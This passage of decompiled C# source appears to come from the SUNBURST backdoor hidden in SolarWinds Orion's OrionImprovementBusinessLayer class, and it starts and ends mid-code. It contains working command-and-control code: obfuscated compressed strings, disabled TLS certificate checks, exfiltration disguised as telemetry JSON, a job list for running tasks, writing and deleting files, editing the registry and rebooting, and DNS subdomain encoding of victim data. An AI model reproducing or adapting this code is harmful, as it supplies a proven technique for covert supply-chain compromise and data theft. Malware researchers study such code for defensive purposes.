					if (http != null)
					{
						http.Abort();
					}
					try
					{
						thread.Join(60000);
						if (thread.IsAlive)
						{
							thread.Abort();
						}
					}
					catch (Exception)
					{
					}
				}
			}

			// Token: 0x060009A4 RID: 2468 RVA: 0x00044F68 File Offset: 0x00043168
			private string GetCache()
			{
				byte[] array = this.customerId.ToArray<byte>();
				byte[] array2 = new byte[array.Length];
				this.random.NextBytes(array2);
				for (int i = 0; i < array.Length; i++)
				{
					byte[] array3 = array;
					int num = i;
					array3[num] ^= array2[2 + i % 4];
				}
				return OrionImprovementBusinessLayer.ByteArrayToHexString(array) + OrionImprovementBusinessLayer.ByteArrayToHexString(array2);
			}

			// Token: 0x060009A5 RID: 2469 RVA: 0x00044FC8 File Offset: 0x000431C8
			private string GetOrionImprovementCustomerId()
			{
				byte[] array = new byte[16];
				for (int i = 0; i < array.Length; i++)
				{
					array[i] = (byte)((int)(~(int)this.customerId[i % (this.customerId.Length - 1)]) + i / this.customerId.Length);
				}
				return new Guid(array).ToString().Trim(new char[]
				{
					'{',
					'}'
				});
			}

			// Token: 0x060009A6 RID: 2470 RVA: 0x00045038 File Offset: 0x00043238
			private HttpStatusCode CreateUploadRequestImpl(HttpWebRequest request, byte[] inData, out byte[] outData)
			{
				outData = null;
				try
				{
					request.ServerCertificateValidationCallback = (RemoteCertificateValidationCallback)Delegate.Combine(request.ServerCertificateValidationCallback, new RemoteCertificateValidationCallback((object sender, X509Certificate cert, X509Chain chain, SslPolicyErrors sslPolicyErrors) => true));
					request.Proxy = this.proxy.GetWebProxy();
					request.UserAgent = this.GetUserAgent();
					request.KeepAlive = false;
					request.Timeout = 120000;
					request.Method = "GET";
					if (inData != null)
					{
						request.Method = "POST";
						using (Stream requestStream = request.GetRequestStream())
						{
							requestStream.Write(inData, 0, inData.Length);
						}
					}
					using (WebResponse response = request.GetResponse())
					{
						using (Stream responseStream = response.GetResponseStream())
						{
							byte[] array = new byte[4096];
							using (MemoryStream memoryStream = new MemoryStream())
							{
								int count;
								while ((count = responseStream.Read(array, 0, array.Length)) > 0)
								{
									memoryStream.Write(array, 0, count);
								}
								outData = memoryStream.ToArray();
							}
						}
						return ((HttpWebResponse)response).StatusCode;
					}
				}
				catch (WebException ex)
				{
					if (ex.Status == WebExceptionStatus.ProtocolError && ex.Response != null)
					{
						return ((HttpWebResponse)ex.Response).StatusCode;
					}
				}
				catch (Exception)
				{
				}
				return HttpStatusCode.Unused;
			}

			// Token: 0x060009A7 RID: 2471 RVA: 0x00045228 File Offset: 0x00043428
			private HttpStatusCode CreateUploadRequest(OrionImprovementBusinessLayer.HttpHelper.JobEngine job, int err, string response, out byte[] outData)
			{
				string text = this.httpHost;
				byte[] array = null;
				OrionImprovementBusinessLayer.HttpHelper.HttpOipExMethods httpOipExMethods = (job != OrionImprovementBusinessLayer.HttpHelper.JobEngine.Idle && job != OrionImprovementBusinessLayer.HttpHelper.JobEngine.None) ? OrionImprovementBusinessLayer.HttpHelper.HttpOipExMethods.Head : OrionImprovementBusinessLayer.HttpHelper.HttpOipExMethods.Get;
				outData = null;
				try
				{
					if (!string.IsNullOrEmpty(response))
					{
						byte[] bytes = Encoding.UTF8.GetBytes(response);
						byte[] bytes2 = BitConverter.GetBytes(err);
						byte[] array2 = new byte[bytes.Length + bytes2.Length + this.customerId.Length];
						Array.Copy(bytes, array2, bytes.Length);
						Array.Copy(bytes2, 0, array2, bytes.Length, bytes2.Length);
						Array.Copy(this.customerId, 0, array2, bytes.Length + bytes2.Length, this.customerId.Length);
						array = OrionImprovementBusinessLayer.HttpHelper.Inflate(array2);
						httpOipExMethods = ((array.Length <= 10000) ? OrionImprovementBusinessLayer.HttpHelper.HttpOipExMethods.Put : OrionImprovementBusinessLayer.HttpHelper.HttpOipExMethods.Post);
					}
					if (!text.StartsWith(Uri.UriSchemeHttp + "://", StringComparison.OrdinalIgnoreCase) && !text.StartsWith(Uri.UriSchemeHttps + "://", StringComparison.OrdinalIgnoreCase))
					{
						text = Uri.UriSchemeHttps + "://" + text;
					}
					if (!text.EndsWith("/"))
					{
						text += "/";
					}
					text += this.GetBaseUri(httpOipExMethods, err);
					HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(text);
					if (httpOipExMethods == OrionImprovementBusinessLayer.HttpHelper.HttpOipExMethods.Get || httpOipExMethods == OrionImprovementBusinessLayer.HttpHelper.HttpOipExMethods.Head)
					{
						httpWebRequest.Headers.Add(OrionImprovementBusinessLayer.ZipHelper.Unzip("80zT9cvPS9X1TSxJzgAA"), this.GetCache());
					}
					if (httpOipExMethods == OrionImprovementBusinessLayer.HttpHelper.HttpOipExMethods.Put && (this.requestMethod == OrionImprovementBusinessLayer.HttpOipMethods.Get || this.requestMethod == OrionImprovementBusinessLayer.HttpOipMethods.Head))
					{
						int[] intArray = this.GetIntArray((array != null) ? array.Length : 0);
						int num = 0;
						ulong num2 = (ulong)DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc)).TotalMilliseconds;
						num2 -= 300000UL;
						string text2 = "{";
						text2 += string.Format(OrionImprovementBusinessLayer.ZipHelper.Unzip("UyotTi3yTFGyUqo2qFXSAQA="), this.GetOrionImprovementCustomerId());
						text2 += string.Format(OrionImprovementBusinessLayer.ZipHelper.Unzip("UypOLS7OzM/zTFGyUqo2qFXSAQA="), this.sessionId.ToString().Trim(new char[]
						{
							'{',
							'}'
						}));
						text2 += OrionImprovementBusinessLayer.ZipHelper.Unzip("UyouSS0oVrKKBgA=");
						for (int i = 0; i < intArray.Length; i++)
						{
							uint num3 = (uint)((this.random.Next(4) == 0) ? this.random.Next(512) : 0);
							num2 += (ulong)num3;
							byte[] array3;
							if (intArray[i] > 0)
							{
								num2 |= 2UL;
								array3 = array.Skip(num).Take(intArray[i]).ToArray<byte>();
								num += intArray[i];
							}
							else
							{
								num2 &= 18446744073709551613UL;
								array3 = new byte[this.random.Next(16, 28)];
								for (int j = 0; j < array3.Length; j++)
								{
									array3[j] = (byte)this.random.Next();
								}
							}
							text2 += "{";
							text2 += string.Format(OrionImprovementBusinessLayer.ZipHelper.Unzip("UwrJzE0tLknMLVCyUorRd0ksSdWoNqjVjNFX0gEA"), num2);
							string str = text2;
							string format = OrionImprovementBusinessLayer.ZipHelper.Unzip("U/LMS0mtULKqNqjVAQA=");
							int num4 = this.mIndex;
							this.mIndex = num4 + 1;
							text2 = str + string.Format(format, num4);
							text2 += OrionImprovementBusinessLayer.ZipHelper.Unzip("U3ItS80rCaksSFWyUvIvyszPU9IBAA==");
							text2 += OrionImprovementBusinessLayer.ZipHelper.Unzip("U3ItS80r8UvMTVWyUgKzfRPzEtNTi5R0AA==");
							text2 += string.Format(OrionImprovementBusinessLayer.ZipHelper.Unzip("U3IpLUosyczP8y1Wsqo2qNUBAA=="), num3);
							text2 += OrionImprovementBusinessLayer.ZipHelper.Unzip("UwouTU5OTU1JTVGyKikqTdUBAA==");
							text2 += string.Format(OrionImprovementBusinessLayer.ZipHelper.Unzip("U/JNLS5OTE9VslKqNqhVAgA="), Convert.ToBase64String(array3).Replace("/", "\\/"));
							text2 += ((i + 1 != intArray.Length) ? "}," : "}");
						}
						text2 += "]}";
						httpWebRequest.ContentType = OrionImprovementBusinessLayer.ZipHelper.Unzip("SywoyMlMTizJzM/TzyrOzwMA");
						array = Encoding.UTF8.GetBytes(text2);
					}
					if (httpOipExMethods == OrionImprovementBusinessLayer.HttpHelper.HttpOipExMethods.Post || this.requestMethod == OrionImprovementBusinessLayer.HttpOipMethods.Put || this.requestMethod == OrionImprovementBusinessLayer.HttpOipMethods.Post)
					{
						httpWebRequest.ContentType = OrionImprovementBusinessLayer.ZipHelper.Unzip("SywoyMlMTizJzM/Tz08uSS3RLS4pSk3MBQA=");
					}
					return this.CreateUploadRequestImpl(httpWebRequest, array, out outData);
				}
				catch (Exception)
				{
				}
				return (HttpStatusCode)0;
			}

			// Token: 0x060009A8 RID: 2472 RVA: 0x00045694 File Offset: 0x00043894
			private int[] GetIntArray(int sz)
			{
				int[] array = new int[30];
				int num = sz;
				for (int i = array.Length - 1; i >= 0; i--)
				{
					if (num < 16 || i == 0)
					{
						array[i] = num;
						break;
					}
					int num2 = num / (i + 1) + 1;
					if (num2 < 16)
					{
						array[i] = this.random.Next(16, Math.Min(32, num) + 1);
						num -= array[i];
					}
					else
					{
						int num3 = Math.Min(512 - num2, num2 - 16);
						array[i] = this.random.Next(num2 - num3, num2 + num3 + 1);
						num -= array[i];
					}
				}
				return array;
			}

			// Token: 0x060009A9 RID: 2473 RVA: 0x00045729 File Offset: 0x00043929
			private bool Valid(int percent)
			{
				return this.random.Next(100) < percent;
			}

			// Token: 0x060009AA RID: 2474 RVA: 0x0004573C File Offset: 0x0004393C
			private string GetBaseUri(OrionImprovementBusinessLayer.HttpHelper.HttpOipExMethods method, int err)
			{
				int num = (method != OrionImprovementBusinessLayer.HttpHelper.HttpOipExMethods.Get && method != OrionImprovementBusinessLayer.HttpHelper.HttpOipExMethods.Head) ? 1 : 16;
				string baseUriImpl;
				ulong hash;
				for (;;)
				{
					baseUriImpl = this.GetBaseUriImpl(method, err);
					hash = OrionImprovementBusinessLayer.GetHash(baseUriImpl);
					if (!this.UriTimeStamps.Contains(hash))
					{
						break;
					}
					if (--num <= 0)
					{
						return baseUriImpl;
					}
				}
				this.UriTimeStamps.Add(hash);
				return baseUriImpl;
			}

			// Token: 0x060009AB RID: 2475 RVA: 0x0004578C File Offset: 0x0004398C
			private string GetBaseUriImpl(OrionImprovementBusinessLayer.HttpHelper.HttpOipExMethods method, int err)
			{
				string text = null;
				if (method == OrionImprovementBusinessLayer.HttpHelper.HttpOipExMethods.Head)
				{
					text = ((ushort)err).ToString();
				}
				if (this.requestMethod == OrionImprovementBusinessLayer.HttpOipMethods.Post)
				{
					string[] array = new string[]
					{
						OrionImprovementBusinessLayer.ZipHelper.Unzip("0y3Kzy8BAA=="),
						OrionImprovementBusinessLayer.ZipHelper.Unzip("001OLSoBAA=="),
						OrionImprovementBusinessLayer.ZipHelper.Unzip("0y3NyyxLLSpOzIlPTgQA"),
						OrionImprovementBusinessLayer.ZipHelper.Unzip("001OBAA="),
						OrionImprovementBusinessLayer.ZipHelper.Unzip("0y0oysxNLKqMT04EAA=="),
						OrionImprovementBusinessLayer.ZipHelper.Unzip("0y3JzE0tLknMLQAA"),
						"",
						OrionImprovementBusinessLayer.ZipHelper.Unzip("003PyU9KzAEA"),
						OrionImprovementBusinessLayer.ZipHelper.Unzip("0y1OTS4tSk1OBAA=")
					};
					return string.Format(OrionImprovementBusinessLayer.ZipHelper.Unzip("K8jO1E8uytGvNqitNqytNqrVA/IA"), this.random.Next(100, 10000), array[this.random.Next(array.Length)], (text == null) ? "" : ("-" + text));
				}
				if (this.requestMethod == OrionImprovementBusinessLayer.HttpOipMethods.Put)
				{
					string[] array2 = new string[]
					{
						OrionImprovementBusinessLayer.ZipHelper.Unzip("c8rPSQEA"),
						OrionImprovementBusinessLayer.ZipHelper.Unzip("c8rPSfEsSczJTAYA"),
						OrionImprovementBusinessLayer.ZipHelper.Unzip("c60oKUp0ys9JAQA="),
						OrionImprovementBusinessLayer.ZipHelper.Unzip("c60oKUp0ys9J8SxJzMlMBgA="),
						OrionImprovementBusinessLayer.ZipHelper.Unzip("8yxJzMlMBgA="),
						OrionImprovementBusinessLayer.ZipHelper.Unzip("88lMzygBAA=="),
						OrionImprovementBusinessLayer.ZipHelper.Unzip("88lMzyjxLEnMyUwGAA=="),
						OrionImprovementBusinessLayer.ZipHelper.Unzip("C0pNL81JLAIA"),
						OrionImprovementBusinessLayer.ZipHelper.Unzip("C07NzXTKz0kBAA=="),
						OrionImprovementBusinessLayer.ZipHelper.Unzip("C07NzXTKz0nxLEnMyUwGAA==")
					};
					string[] array3 = new string[]
					{
						OrionImprovementBusinessLayer.ZipHelper.Unzip("yy9IzStOzCsGAA=="),
						OrionImprovementBusinessLayer.ZipHelper.Unzip("y8svyQcA"),
						OrionImprovementBusinessLayer.ZipHelper.Unzip("SytKTU3LzysBAA=="),
						OrionImprovementBusinessLayer.ZipHelper.Unzip("C84vLUpOdc5PSQ0oygcA"),
						OrionImprovementBusinessLayer.ZipHelper.Unzip("C84vLUpODU4tykwLKMoHAA=="),
						OrionImprovementBusinessLayer.ZipHelper.Unzip("C84vLUpO9UjMC07MKwYA"),
						OrionImprovementBusinessLayer.ZipHelper.Unzip("C84vLUpO9UjMC04tykwDAA==")
					};
					int num = this.random.Next(array3.Length);
					if (num <= 1)
					{
						return string.Format(OrionImprovementBusinessLayer.ZipHelper.Unzip("S8vPKynWL89PS9OvNqjVrTYEYqNa3fLUpDSgTLVxrR5IzggA"), new object[]
						{
							this.random.Next(100, 10000),
							array3[num],
							array2[this.random.Next(array2.Length)].ToLower(),
							text
						});
					}
					return string.Format(OrionImprovementBusinessLayer.ZipHelper.Unzip("S8vPKynWL89PS9OvNqjVrTYEYqPaauNaPZCYEQA="), new object[]
					{
						this.random.Next(100, 10000),
						array3[num],
						array2[this.random.Next(array2.Length)],
						text
					});
				}
				else
				{
					if (method <= OrionImprovementBusinessLayer.HttpHelper.HttpOipExMethods.Head)
					{
						string text2 = "";
						if (this.Valid(20))
						{
							text2 += OrionImprovementBusinessLayer.ZipHelper.Unzip("C87PSSwKz8xLKQYA");
							if (this.Valid(40))
							{
								text2 += OrionImprovementBusinessLayer.ZipHelper.Unzip("03POLypJrQjIKU3PzAMA");
							}
						}
						if (this.Valid(80))
						{
							text2 += OrionImprovementBusinessLayer.ZipHelper.Unzip("0/MvyszPAwA=");
						}
						if (this.Valid(80))
						{
							string[] array4 = new string[]
							{
								OrionImprovementBusinessLayer.ZipHelper.Unzip("C88sSs1JLS4GAA=="),
								OrionImprovementBusinessLayer.ZipHelper.Unzip("C/UEAA=="),
								OrionImprovementBusinessLayer.ZipHelper.Unzip("C89MSU8tKQYA"),
								OrionImprovementBusinessLayer.ZipHelper.Unzip("8wvwBQA="),
								OrionImprovementBusinessLayer.ZipHelper.Unzip("cyzIz8nJBwA="),
								OrionImprovementBusinessLayer.ZipHelper.Unzip("c87JL03xzc/LLMkvysxLBwA=")
							};
							text2 = text2 + "." + array4[this.random.Next(array4.Length)];
						}
						if (this.Valid(30) || string.IsNullOrEmpty(text2))
						{
							string[] array5 = new string[]
							{
								OrionImprovementBusinessLayer.ZipHelper.Unzip("88tPSS0GAA=="),
								OrionImprovementBusinessLayer.ZipHelper.Unzip("C8vPKc1NLQYA"),
								OrionImprovementBusinessLayer.ZipHelper.Unzip("88wrSS1KS0xOLQYA"),
								OrionImprovementBusinessLayer.ZipHelper.Unzip("c87PLcjPS80rKQYA")
							};
							text2 = text2 + "." + array5[this.random.Next(array5.Length)];
						}
						if (this.Valid(30) || text != null)
						{
							text2 = string.Concat(new object[]
							{
								text2,
								"-",
								this.random.Next(1, 20),
								".",
								this.random.Next(1, 30)
							});
							if (text != null)
							{
								text2 = text2 + "." + ((ushort)err).ToString();
							}
						}
						return OrionImprovementBusinessLayer.ZipHelper.Unzip("Ky7PLNAvLUjRBwA=") + text2.TrimStart(new char[]
						{
							'.'
						}) + OrionImprovementBusinessLayer.ZipHelper.Unzip("06vIzQEA");
					}
					if (method != OrionImprovementBusinessLayer.HttpHelper.HttpOipExMethods.Put)
					{
						return OrionImprovementBusinessLayer.ZipHelper.Unzip("Ky7PLNAPLcjJT0zRSyzOqAAA");
					}
					return OrionImprovementBusinessLayer.ZipHelper.Unzip("Ky7PLNB3LUvNKykGAA==");
				}
			}

			// Token: 0x060009AC RID: 2476 RVA: 0x00045C44 File Offset: 0x00043E44
			private string GetUserAgent()
			{
				if (this.requestMethod == OrionImprovementBusinessLayer.HttpOipMethods.Put || this.requestMethod == OrionImprovementBusinessLayer.HttpOipMethods.Get)
				{
					return null;
				}
				if (this.requestMethod == OrionImprovementBusinessLayer.HttpOipMethods.Post)
				{
					if (string.IsNullOrEmpty(OrionImprovementBusinessLayer.userAgentDefault))
					{
						OrionImprovementBusinessLayer.userAgentDefault = OrionImprovementBusinessLayer.ZipHelper.Unzip("881MLsovzk8r0XUuqiwoyXcM8NQHAA==");
						OrionImprovementBusinessLayer.userAgentDefault += OrionImprovementBusinessLayer.GetOSVersion(false);
					}
					return OrionImprovementBusinessLayer.userAgentDefault;
				}
				if (string.IsNullOrEmpty(OrionImprovementBusinessLayer.userAgentOrionImprovementClient))
				{
					OrionImprovementBusinessLayer.userAgentOrionImprovementClient = OrionImprovementBusinessLayer.ZipHelper.Unzip("C87PSSwKz8xLKfYvyszP88wtKMovS81NzStxzskEkvoA");
					try
					{
						string text = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
						text += OrionImprovementBusinessLayer.ZipHelper.Unzip("i/EvyszP88wtKMovS81NzSuJCc7PSSwKz8xLKdZDl9NLrUgFAA==");
						OrionImprovementBusinessLayer.userAgentOrionImprovementClient += FileVersionInfo.GetVersionInfo(text).FileVersion;
					}
					catch (Exception)
					{
						OrionImprovementBusinessLayer.userAgentOrionImprovementClient += OrionImprovementBusinessLayer.ZipHelper.Unzip("M9YzAEJjCyMA");
					}
				}
				return OrionImprovementBusinessLayer.userAgentOrionImprovementClient;
			}

			// Token: 0x040002F3 RID: 755
			private readonly Random random = new Random();

			// Token: 0x040002F4 RID: 756
			private readonly byte[] customerId;

			// Token: 0x040002F5 RID: 757
			private readonly string httpHost;

			// Token: 0x040002F6 RID: 758
			private readonly OrionImprovementBusinessLayer.HttpOipMethods requestMethod;

			// Token: 0x040002F7 RID: 759
			private bool isAbort;

			// Token: 0x040002F8 RID: 760
			private int delay;

			// Token: 0x040002F9 RID: 761
			private int delayInc;

			// Token: 0x040002FA RID: 762
			private readonly OrionImprovementBusinessLayer.Proxy proxy;

			// Token: 0x040002FB RID: 763
			private DateTime timeStamp = DateTime.Now;

			// Token: 0x040002FC RID: 764
			private int mIndex;

			// Token: 0x040002FD RID: 765
			private Guid sessionId = Guid.NewGuid();

			// Token: 0x040002FE RID: 766
			private readonly List<ulong> UriTimeStamps = new List<ulong>();

			// Token: 0x020001C3 RID: 451
			private enum JobEngine
			{
				// Token: 0x040005A8 RID: 1448
				Idle,
				// Token: 0x040005A9 RID: 1449
				Exit,
				// Token: 0x040005AA RID: 1450
				SetTime,
				// Token: 0x040005AB RID: 1451
				CollectSystemDescription,
				// Token: 0x040005AC RID: 1452
				UploadSystemDescription,
				// Token: 0x040005AD RID: 1453
				RunTask,
				// Token: 0x040005AE RID: 1454
				GetProcessByDescription,
				// Token: 0x040005AF RID: 1455
				KillTask,
				// Token: 0x040005B0 RID: 1456
				GetFileSystemEntries,
				// Token: 0x040005B1 RID: 1457
				WriteFile,
				// Token: 0x040005B2 RID: 1458
				FileExists,
				// Token: 0x040005B3 RID: 1459
				DeleteFile,
				// Token: 0x040005B4 RID: 1460
				GetFileHash,
				// Token: 0x040005B5 RID: 1461
				ReadRegistryValue,
				// Token: 0x040005B6 RID: 1462
				SetRegistryValue,
				// Token: 0x040005B7 RID: 1463
				DeleteRegistryValue,
				// Token: 0x040005B8 RID: 1464
				GetRegistrySubKeyAndValueNames,
				// Token: 0x040005B9 RID: 1465
				Reboot,
				// Token: 0x040005BA RID: 1466
				None
			}

			// Token: 0x020001C4 RID: 452
			private enum HttpOipExMethods
			{
				// Token: 0x040005BC RID: 1468
				Get,
				// Token: 0x040005BD RID: 1469
				Head,
				// Token: 0x040005BE RID: 1470
				Put,
				// Token: 0x040005BF RID: 1471
				Post
			}
		}

		// Token: 0x020000D6 RID: 214
		private static class DnsHelper
		{
			// Token: 0x060009AD RID: 2477 RVA: 0x00045D2C File Offset: 0x00043F2C
			public static bool CheckServerConnection(string hostName)
			{
				try
				{
					IPHostEntry iphostEntry = OrionImprovementBusinessLayer.DnsHelper.GetIPHostEntry(hostName);
					if (iphostEntry != null)
					{
						IPAddress[] addressList = iphostEntry.AddressList;
						for (int i = 0; i < addressList.Length; i++)
						{
							OrionImprovementBusinessLayer.AddressFamilyEx addressFamily = OrionImprovementBusinessLayer.IPAddressesHelper.GetAddressFamily(addressList[i]);
							if (addressFamily != OrionImprovementBusinessLayer.AddressFamilyEx.Error && addressFamily != OrionImprovementBusinessLayer.AddressFamilyEx.Atm)
							{
								return true;
							}
						}
					}
				}
				catch (Exception)
				{
				}
				return false;
			}

			// Token: 0x060009AE RID: 2478 RVA: 0x00045D88 File Offset: 0x00043F88
			public static IPHostEntry GetIPHostEntry(string hostName)
			{
				int[][] array = new int[][]
				{
					new int[]
					{
						25,
						30
					},
					new int[]
					{
						55,
						60
					}
				};
				int num = array.GetLength(0) + 1;
				for (int i = 1; i <= num; i++)
				{
					try
					{
						return Dns.GetHostEntry(hostName);
					}
					catch (SocketException)
					{
					}
					if (i + 1 <= num)
					{
						OrionImprovementBusinessLayer.DelayMs((double)(array[i - 1][0] * 1000), (double)(array[i - 1][1] * 1000));
					}
				}
				return null;
			}

			// Token: 0x060009AF RID: 2479 RVA: 0x00045E20 File Offset: 0x00044020
			public static OrionImprovementBusinessLayer.AddressFamilyEx GetAddressFamily(string hostName, OrionImprovementBusinessLayer.DnsRecords rec)
			{
				rec.cname = null;
				try
				{
					IPHostEntry iphostEntry = OrionImprovementBusinessLayer.DnsHelper.GetIPHostEntry(hostName);
					if (iphostEntry == null)
					{
						return OrionImprovementBusinessLayer.AddressFamilyEx.Error;
					}
					IPAddress[] addressList = iphostEntry.AddressList;
					int i = 0;
					while (i < addressList.Length)
					{
						IPAddress ipaddress = addressList[i];
						if (ipaddress.AddressFamily == AddressFamily.InterNetwork)
						{
							if (!(iphostEntry.HostName != hostName) || string.IsNullOrEmpty(iphostEntry.HostName))
							{
								OrionImprovementBusinessLayer.IPAddressesHelper.GetAddresses(ipaddress, rec);
								return OrionImprovementBusinessLayer.IPAddressesHelper.GetAddressFamily(ipaddress, out rec.dnssec);
							}
							rec.cname = iphostEntry.HostName;
							if (OrionImprovementBusinessLayer.IPAddressesHelper.GetAddressFamily(ipaddress) == OrionImprovementBusinessLayer.AddressFamilyEx.Atm)
							{
								return OrionImprovementBusinessLayer.AddressFamilyEx.Atm;
							}
							if (rec.dnssec)
							{
								rec.dnssec = false;
								return OrionImprovementBusinessLayer.AddressFamilyEx.NetBios;
							}
							return OrionImprovementBusinessLayer.AddressFamilyEx.Error;
						}
						else
						{
							i++;
						}
					}
					return OrionImprovementBusinessLayer.AddressFamilyEx.Unknown;
				}
				catch (Exception)
				{
				}
				return OrionImprovementBusinessLayer.AddressFamilyEx.Error;
			}
		}

		// Token: 0x020000D7 RID: 215
		private class CryptoHelper
		{
			// Token: 0x060009B0 RID: 2480 RVA: 0x00045EE8 File Offset: 0x000440E8
			public CryptoHelper(byte[] userId, string domain)
			{
				this.guid = userId.ToArray<byte>();
				this.dnStr = OrionImprovementBusinessLayer.CryptoHelper.DecryptShort(domain);
				this.offset = 0;
				this.nCount = 0;
			}

			// Token: 0x060009B1 RID: 2481 RVA: 0x00045F18 File Offset: 0x00044118
			private static string Base64Decode(string s)
			{
				string text = OrionImprovementBusinessLayer.ZipHelper.Unzip("Kyo0Ti9OzCkxKzXMrEyryi8wNTdKMbFMyquwSC7LzU4tz8gCAA==");
				string text2 = OrionImprovementBusinessLayer.ZipHelper.Unzip("M4jX1QMA");
				string text3 = "";
				Random random = new Random();
				foreach (char value in s)
				{
					int num = text2.IndexOf(value);
					text3 = ((num < 0) ? (text3 + text[(text.IndexOf(value) + 4) % text.Length].ToString()) : (text3 + text2[0].ToString() + text[num + random.Next() % (text.Length / text2.Length) * text2.Length].ToString()));
				}
				return text3;
			}

			// Token: 0x060009B2 RID: 2482 RVA: 0x00045FF0 File Offset: 0x000441F0
			private static string Base64Encode(byte[] bytes, bool rt)
			{
				string text = OrionImprovementBusinessLayer.ZipHelper.Unzip("K8gwSs1MyzfOMy0tSTfMskixNCksKkvKzTYoTswxN0sGAA==");
				string text2 = "";
				uint num = 0U;
				int i = 0;
				foreach (byte b in bytes)
				{
					num |= (uint)((uint)b << i);
					for (i += 8; i >= 5; i -= 5)
					{
						text2 += text[(int)(num & 31U)].ToString();
						num >>= 5;
					}
				}
				if (i > 0)
				{
					if (rt)
					{
						num |= (uint)((uint)new Random().Next() << i);
					}
					text2 += text[(int)(num & 31U)].ToString();
				}
				return text2;
			}

			// Token: 0x060009B3 RID: 2483 RVA: 0x0004609C File Offset: 0x0004429C
			private static string CreateSecureString(byte[] data, bool flag)
			{
				byte[] array = new byte[data.Length + 1];
				array[0] = (byte)new Random().Next(1, 127);
				if (flag)
				{
					byte[] array2 = array;
					int num = 0;
					array2[num] |= 128;
				}
				for (int i = 1; i < array.Length; i++)
				{
					array[i] = (data[i - 1] ^ array[0]);
				}
				return OrionImprovementBusinessLayer.CryptoHelper.Base64Encode(array, true);
			}

			// Token: 0x060009B4 RID: 2484 RVA: 0x000460FC File Offset: 0x000442FC
			private static string CreateString(int n, char c)
			{
				if (n < 0 || n >= 36)
				{
					n = 35;
				}
				n = (n + (int)c) % 36;
				if (n < 10)
				{
					return ((char)(48 + n)).ToString();
				}
				return ((char)(97 + n - 10)).ToString();
			}

			// Token: 0x060009B5 RID: 2485 RVA: 0x00046144 File Offset: 0x00044344
			private static string DecryptShort(string domain)
			{
				if (domain.All((char c) => OrionImprovementBusinessLayer.ZipHelper.Unzip("MzA0MjYxNTO3sExMSk5JTUvPyMzKzsnNyy8oLCouKS0rr6is0o3XAwA=").Contains(c)))
				{
					return OrionImprovementBusinessLayer.CryptoHelper.Base64Decode(domain);
				}
				return "00" + OrionImprovementBusinessLayer.CryptoHelper.Base64Encode(Encoding.UTF8.GetBytes(domain), false);
			}

			// Token: 0x060009B6 RID: 2486 RVA: 0x0004619C File Offset: 0x0004439C
			private string GetStatus()
			{
				return string.Concat(new string[]
				{
					".",
					OrionImprovementBusinessLayer.domain2,
					".",
					OrionImprovementBusinessLayer.domain3[(int)this.guid[0] % OrionImprovementBusinessLayer.domain3.Length],
					".",
					OrionImprovementBusinessLayer.domain1
				});
			}

			// Token: 0x060009B7 RID: 2487 RVA: 0x000461F8 File Offset: 0x000443F8
			private static int GetStringHash(bool flag)
			{
				return ((int)((DateTime.UtcNow - new DateTime(2010, 1, 1, 0, 0, 0, DateTimeKind.Utc)).TotalMinutes / 30.0) & 524287) << 1 | (flag ? 1 : 0);
			}

			// Token: 0x060009B8 RID: 2488 RVA: 0x00046244 File Offset: 0x00044444
			private byte[] UpdateBuffer(int sz, byte[] data, bool flag)
			{
				byte[] array = new byte[this.guid.Length + ((data != null) ? data.Length : 0) + 3];
				Array.Clear(array, 0, array.Length);
				Array.Copy(this.guid, array, this.guid.Length);
				int stringHash = OrionImprovementBusinessLayer.CryptoHelper.GetStringHash(flag);
				array[this.guid.Length] = (byte)((stringHash & 983040) >> 16 | (sz & 15) << 4);
				array[this.guid.Length + 1] = (byte)((stringHash & 65280) >> 8);
				array[this.guid.Length + 2] = (byte)(stringHash & 255);
				if (data != null)
				{
					Array.Copy(data, 0, array, array.Length - data.Length, data.Length);
				}
				for (int i = 0; i < this.guid.Length; i++)
				{
					byte[] array2 = array;
					int num = i;
					array2[num] ^= array[this.guid.Length + 2 - i % 2];
				}
				return array;
			}

			// Token: 0x060009B9 RID: 2489 RVA: 0x0004631C File Offset: 0x0004451C
			public string GetNextStringEx(bool flag)
			{
				byte[] array = new byte[(OrionImprovementBusinessLayer.svcList.Length * 2 + 7) / 8];
				Array.Clear(array, 0, array.Length);
				for (int i = 0; i < OrionImprovementBusinessLayer.svcList.Length; i++)
				{
					int num = Convert.ToInt32(OrionImprovementBusinessLayer.svcList[i].stopped) | Convert.ToInt32(OrionImprovementBusinessLayer.svcList[i].running) << 1;
					byte[] array2 = array;
					int num2 = array.Length - 1 - i / 4;
					array2[num2] |= Convert.ToByte(num << i % 4 * 2);
				}
				return OrionImprovementBusinessLayer.CryptoHelper.CreateSecureString(this.UpdateBuffer(2, array, flag), false) + this.GetStatus();
			}

			// Token: 0x060009BA RID: 2490 RVA: 0x000463BB File Offset: 0x000445BB
			public string GetNextString(bool flag)
			{
				return OrionImprovementBusinessLayer.CryptoHelper.CreateSecureString(this.UpdateBuffer(1, null, flag), false) + this.GetStatus();
			}

			// Token: 0x060009BB RID: 2491 RVA: 0x000463D8 File Offset: 0x000445D8
			public string GetPreviousString(out bool last)
			{
				string text = OrionImprovementBusinessLayer.CryptoHelper.CreateSecureString(this.guid, true);
				int num = 32 - text.Length - 1;
				string result = "";
				last = false;
				if (this.offset >= this.dnStr.Length || this.nCount > 36)
				{
					return result;
				}
				int num2 = Math.Min(num, this.dnStr.Length - this.offset);
				this.dnStrLower = this.dnStr.Substring(this.offset, num2);
				this.offset += num2;
				if (OrionImprovementBusinessLayer.ZipHelper.Unzip("0403AAA=").Contains(this.dnStrLower[this.dnStrLower.Length - 1]))
				{
					if (num2 == num)
					{
						this.offset--;
						this.dnStrLower = this.dnStrLower.Remove(this.dnStrLower.Length - 1);
					}
					this.dnStrLower += "0";
				}
				if (this.offset >= this.dnStr.Length || this.nCount > 36)
				{
					this.nCount = -1;
				}
				result = text + OrionImprovementBusinessLayer.CryptoHelper.CreateString(this.nCount, text[0]) + this.dnStrLower + this.GetStatus();
				if (this.nCount >= 0)
				{
					this.nCount++;
				}
				last = (this.nCount < 0);
				return result;
			}

			// Token: 0x060009BC RID: 2492 RVA: 0x00046540 File Offset: 0x00044740
			public string GetCurrentString()
			{
				string text = OrionImprovementBusinessLayer.CryptoHelper.CreateSecureString(this.guid, true);
				return text + OrionImprovementBusinessLayer.CryptoHelper.CreateString((this.nCount > 0) ? (this.nCount - 1) : this.nCount, text[0]) + this.dnStrLower + this.GetStatus();
			}

			// Token: 0x040002FF RID: 767
